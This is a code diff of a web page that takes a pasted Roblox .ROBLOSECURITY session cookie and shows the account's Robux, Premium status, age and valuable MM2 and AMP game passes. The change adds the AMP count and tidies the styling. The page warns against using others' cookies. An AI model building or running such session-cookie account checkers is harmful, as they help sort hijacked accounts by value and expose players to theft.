@@ -5,58 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox – Account Info from .ROBLOSECURITY</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      max-width: 600px; 
-      margin: 40px auto; 
-      padding: 20px; 
-      background: #111; 
-      color: #eee; 
-    }
-    textarea { 
-      width: 100%; 
-      height: 140px; 
-      background: #222; 
-      color: #eee; 
-      border: 1px solid #444; 
-      padding: 12px; 
-      font-family: monospace; 
-      resize: vertical; 
-    }
-    button { 
-      padding: 14px 32px; 
-      background: #1e90ff; 
-      border: none; 
-      color: white; 
-      font-size: 17px; 
-      cursor: pointer; 
-      margin: 15px 0; 
-      border-radius: 4px; 
-    }
-    button:hover { 
-      background: #0c7ae6; 
-    }
-    #result { 
-      margin-top: 25px; 
-      padding: 20px; 
-      background: #1a1a1a; 
-      border: 1px solid #444; 
-      border-radius: 8px; 
-      min-height: 160px; 
-      line-height: 1.6; 
-    }
-    .error { color: #ff4d4d; }
-    .success { color: #00ff9d; }
-    b { color: #ddd; }
-    small { color: #aaa; }
-    #avatar { 
-      max-width: 100%; 
-      height: auto; 
-      border-radius: 12px; 
-      margin: 15px 0; 
-      border: 2px solid #444; 
-      display: block; 
-    }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 220px; line-height: 1.6; }
+    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
+    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
   </style>
 </head>
 <body>
@@ -67,10 +22,7 @@
   <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and may result in a permanent account ban
 </p>
 
-<textarea 
-  id="cookie" 
-  placeholder="Paste your .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"
-></textarea>
+<textarea id="cookie" placeholder="Paste your .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
 
 <br>
 
@@ -114,46 +66,28 @@ async function checkAccount() {
         ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
         : '<p style="color:#ffcc00;">Could not load avatar</p>';
 
-      // Obliczamy ile MM2 gamepassów z listy (429957 i 1308795) posiada konto
+      // MM2
       const mm2Passes = [429957, 1308795];
-      let mm2Count = 0;
+      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
+      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
 
-      if (json.hasGamePasses && Array.isArray(json.hasGamePasses)) {
-        mm2Count = mm2Passes.filter(id => json.hasGamePasses.includes(id)).length;
-      }
-
-      // Kolor: zielony jeśli ma ≥1, czerwony jeśli 0
-      const countColor = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
+      // AMP
+      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
+      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
 
       result.innerHTML = `
         <span class="success">Account successfully verified!</span><br><br>
-
         ${avatarHtml}
-
         <b>Username:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> 
-          <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-            ${json.hasPremium ? 'YES ✓' : 'NO ✗'}
-          </span><br>
-        <b>Robux balance:</b> 
-          <span style="color: #ffcc00; font-weight: bold;">
-            ${json.robux.toLocaleString('en-US')} Robux
-          </span><br>
-
-        <b>MM2:</b> 
-          <span style="color: ${countColor}; font-weight: bold;">
-            ${mm2Count}
-          </span><br>
-
-        <b>Account age:</b> 
-          <span style="color: #ffcc00; font-weight: bold;">
-            ${json.accountAgeDays} days
-          </span><br>
-
-        <b>Created on:</b> ${creationDate} 
-          ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        <b>Robux balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+        <b>MM2:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
+        <b>Account age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
+        <b>Created on:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
       `;
     }
   } catch (e) {
